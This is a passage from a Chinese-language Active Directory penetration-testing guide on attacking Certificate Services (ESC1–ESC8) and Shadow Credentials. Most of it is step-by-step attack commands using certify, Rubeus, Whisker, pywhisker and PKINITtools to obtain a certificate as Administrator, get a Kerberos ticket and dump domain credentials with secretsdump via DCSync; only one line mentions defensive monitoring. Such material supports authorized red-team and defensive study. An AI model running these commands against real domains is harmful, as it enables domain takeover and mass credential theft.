## 8. ADCS 证书服务攻击

Active Directory Certificate Services (ADCS) 是微软的 PKI 实现，2021 年 SpecterOps 的"Certi"研究揭示了 ADCS 的庞大攻击面——错误配置的证书模板(ESC1-8)可导致从普通域用户直接提权到域管。这是 2021-2026 AD 渗透的重点领域。

### 8.1 ESC1 — 错误模板的证书申请

最常见且致命的 ESC。当证书模板满足：①允许低权限用户申请；②指定申请者可填入 Subject Alternative Name (SAN)；③模板用途包含客户端认证(Client Authentication)；④颁发CA已发布——攻击者可申请一张**任意用户身份**的证书，用该证书 Kerberos 认证即冒充该用户(含域管)。

```bash
# 1. 枚举脆弱模板 (certify)
certify.exe find /vulnerable                    # 列出所有ESC脆弱模板
# 或 BloodHound 的 ADCS 数据 (SharpHound -c All 含证书)

# 2. 申请证书，SAN填Administrator
certify.exe request /ca:corp-CA-01\corp-CA /template:VulnTemplate \
  /altname:Administrator
# 输出 base64 证书

# 3. 转换为PKCS12并PKINIT认证
# 将base64保存为cert.pem，转换
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
  -export -out cert.pfx -pass pass:Pass123!

# 4. 用证书获取Administrator的TGT (Rubeus)
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:<REDACTED> /ptt
# 或 PKINITtools (Linux)
gettgtpkinit.py corp.local/Administrator -cert-pfx cert.pfx -pfx-pass Pass123! admin.ccache

# 5. DCSync接管
export KRB5CCNAME=admin.ccache
secretsdump.py -k -no-pass corp.local/<EMAIL-REDACTED>
```

### 8.2 ESC2-8 概览

| ESC | 漏洞 | 利用 |
|-----|------|------|
| ESC1 | 模板允许任意SAN+客户端认证 | 申请任意身份证书→冒充域管 |
| ESC2 | 模板允许任意用途(Any Purpose) | 可作ESC1用，也可签署其他证书 |
| ESC3 | 模板1允许申请"证书申请代理"证书 | 用代理证书代他人申请任意模板 |
| ESC4 | 对模板对象有GenericAll | 修改模板配置为ESC1 |
| ESC5 | 对CA/容器有过宽ACL | 修改CA配置/启用新模板 |
| ESC6 | CA未启用ENFORCEKERBEROSPREAUTH(EDITF_ATTRIBUTESUBJECTALTNAME2) | 任意模板都可填SAN |
| ESC7 | 对CA有ManageCA权限 | 启用模板/修改CA配置 |
| ESC8 | ADCS HTTP接口可NTLM中继 | PetitPotam→ADCS(见§5.5) |

```bash
# ESC3 证书申请代理
# 1. 申请一张"证书申请代理"证书(Enrollment Agent模板)
certify.exe request /ca:corp-CA /template:EnrollmentAgent
# 2. 用代理证书代Administrator申请客户端认证证书
certify.exe request /ca:corp-CA /template:UserAuthentication /onbehalfof:corp\\Administrator \
  /enrollcert:agent.pfx /enrollcertpw:Pass
```

### 8.3 Shadow Credentials

Shadow Credentials 是 RBCD 的"证书版"——若对目标有 `GenericWrite`/`GenericAll`，可在目标的 `msDS-KeyCredentialLink` 属性写入攻击者控制的证书公钥，之后用证书(私钥)以该目标身份进行 PKINIT Kerberos 认证，获取其 TGT。

```bash
# 1. 对目标有GenericWrite → 写入KeyCredentialLink (Whisker)
Whisker.exe add /target:targetuser /domain:corp.local
# 输出证书PFX

# 2. 用证书PKINIT认证获取targetuser的TGT
Rubeus.exe asktgt /user:targetuser /certificate:cert.pfx /password:Pass /ptt

# 或用 pywhisker (Linux)
python3 pywhisker.py -d corp.local -u attacker -p Pass --target targetuser --action add
python3 PKINITtools.py corp.local/targetuser -cert-pfx cert.pfx ...
```

> **要点**：Shadow Credentials 是 2021 年后替代 RBCD 的隐蔽提权——无需新建机器账户，直接对目标写证书属性即可。若目标是 DC$ 则直接获 DC 身份→DCSync。防御：监控 msDS-KeyCredentialLink 的非预期写入。

---

